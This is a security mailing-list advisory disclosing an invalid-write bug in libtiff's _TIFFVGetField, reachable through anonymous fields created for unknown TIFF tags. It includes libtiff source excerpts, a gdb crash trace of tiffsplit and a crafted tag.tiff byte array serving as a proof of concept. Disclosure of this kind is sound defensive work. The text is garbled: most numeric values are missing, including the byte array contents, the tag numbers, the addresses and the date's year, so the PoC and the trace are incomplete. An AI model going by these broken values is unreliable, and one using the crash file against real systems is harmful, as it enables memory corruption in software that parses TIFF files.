  oss-security - libtiff: invalid write            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Sat, 26 Dec From: Hans Jerry Illikainen <hji@...topia.com> To: bugtraq@...urityfocus.com, fulldisclosure@...lists.org, oss-security@...ts.openwall.com Subject: libtiff: invalid write   `_TIFFVGetField()' in may write field data for certain extension tags to invalid or possibly arbitrary memory.  Each tag has a `field_passcount' variable in their TIFFField struct:  ,---- | struct _TIFFField { |     uint32 field_tag;                       /* field's tag */ |     short field_readcount;                  /* read count/TIFF_VARIABLE/TIFF_SPP */ |     short field_writecount;                 /* write count/TIFF_VARIABLE */ |     TIFFDataType field_type;                /* type of associated data */ |     uint32 reserved;                        /* reserved for future extension */ |     TIFFSetGetFieldType set_field_type;     /* type to be passed to TIFFSetField */ |     TIFFSetGetFieldType get_field_type;     /* type to be passed to TIFFGetField */ |     unsigned short field_bit;               /* bit in fieldsset bit vector */ |     unsigned char field_oktochange;         /* if true, can change while writing */ |     unsigned char field_passcount;          /* if true, pass dir count on set */ |     char* field_name;                       /* ASCII name */ |     TIFFFieldArray* field_subfields;        /* if field points to child ifds, child ifd field definition array */ | }; `----  For example:  ,---- | static const TIFFField fax3Fields[] = { |     { TIFFTAG_GROUP3OPTIONS, 1, 1, TIFF_LONG, 0, TIFF_SETGET_UINT32, TIFF_SETGET_UINT32, FIELD_OPTIONS, FALSE, FALSE, "Group3Options", NULL }, | }; `----  However, `field_passcount' is always assigned TRUE if the tag is processed by `_TIFFCreateAnonField()'.  This happens on unsuccessful invocations of `TIFFReadDirectoryFindFieldInfo()':  ,---- | int | TIFFReadDirectory(TIFF* tif) | { | [...] |             TIFFReadDirectoryFindFieldInfo(tif,dp->tdir_tag,&fii); |             if (fii == FAILED_FII) |             { |                 TIFFWarningExt(tif->tif_clientdata, module, |                                "Unknown field with tag %d (0x%x) encountered", |                                dp->tdir_tag,dp->tdir_tag); |                 /* the following knowingly leaks the |                    anonymous field structure */ |                 if (!_TIFFMergeFields(tif, |                                       _TIFFCreateAnonField(tif, |                                           dp->tdir_tag, |                                           (TIFFDataType) dp->tdir_type), |                                       1)) { | [...] | } `----  ,---- | TIFFField* | _TIFFCreateAnonField(TIFF *tif, uint32 tag, TIFFDataType field_type) | { |     [...] |     fld->field_bit = FIELD_CUSTOM; |     [...] |     fld->field_passcount = TRUE; |     [...] | } `----  If the field for a 1-count extension tag whose `field_passcount' has been overridden is later read by `_TIFFVGetField()', this happens:  ,---- | static int | _TIFFVGetField(TIFF* tif, uint32 tag, va_list ap) | { |     [...] |     uint32 standard_tag = tag; |     [...] |     if (fip->field_bit == FIELD_CUSTOM) { |         standard_tag = 0; |     } |  |     switch (standard_tag) { |         [...] |         default: |         { |             [...] |             for (i = 0; i < td->td_customValueCount; i++) { |                 [...] |                 if (fip->field_passcount) { |                     if (fip->field_readcount == TIFF_VARIABLE2) |                         *va_arg(ap, uint32*) = (uint32)tv->count; |                     else  /* Assume TIFF_VARIABLE */ |                         *va_arg(ap, uint16*) = (uint16)tv->count; |                     *va_arg(ap, void **) = tv->value; |                     ret_val = 1; |                 } |                 [...] |             } |         } |     } |     [...] | } `----   With an invocation of `TIFFGetField()' such as:  ,---- | TIFFGetField(tif, TIFFTAG_GROUP3OPTIONS, &dst); `----  for a TIFFTAG_GROUP3OPTIONS specified as:  ,---- | | ^^^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^ | tag         type        count                   offset/value `----  the count is written to `dst', whereas is written to invalid/arbitrary memory.   Using the included tiffsplit utility as an example:  ,---- | static int | tiffcp(TIFF* in, TIFF* out) | { |     [...] |     CopyField(TIFFTAG_YRESOLUTION, floatv); |     CopyField(TIFFTAG_GROUP3OPTIONS, longv); |     [...] | } `----  ,---- | $ gdb -q --args tiffsplit tag.tiff | Reading symbols from tiffsplit...done. | (gdb) r | TIFFReadDirectory: Warning, Unknown field with tag encountered. |  | Program received signal SIGSEGV, Segmentation fault. | in _TIFFVGetField at |                            *va_arg(ap, void **) = tv->value; | (gdb) x/i $eip | => at    %edx,(%eax) | (gdb) x/x $edx | | (gdb) x/x $eax | access memory at address | (gdb) `----   tag.tiff: ,---- | unsigned char tiff[] = { |     /* little-endian */ |     |  |     /* version */ |     0x2a, |  |     /* tif->tif_diroff */ |     |     |  |     /* tag count */ |     |  |     /* tag    | type      | count                 | offset/value         */ |     /* TIFFTAG_IMAGEWIDTH */ |     |     /* TIFFTAG_IMAGELENGTH */ |     |     /* TIFFTAG_BITSPERSAMPLE */ |     |     /* TIFFTAG_STRIPOFFSETS */ |     |     /* TIFFTAG_STRIPBYTECOUNTS */ |     |     /* TIFFTAG_YRESOLUTION */ |     0x1b, |     /* TIFFTAG_GROUP3OPTIONS */ |     |  |     /* tif->tif_nextdiroff */ |     |  |     /* bits per sample */ |     |     |     | }; `----   This issue has been assigned and it has yet to be fixed.  --  Hans Jerry Illikainen  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      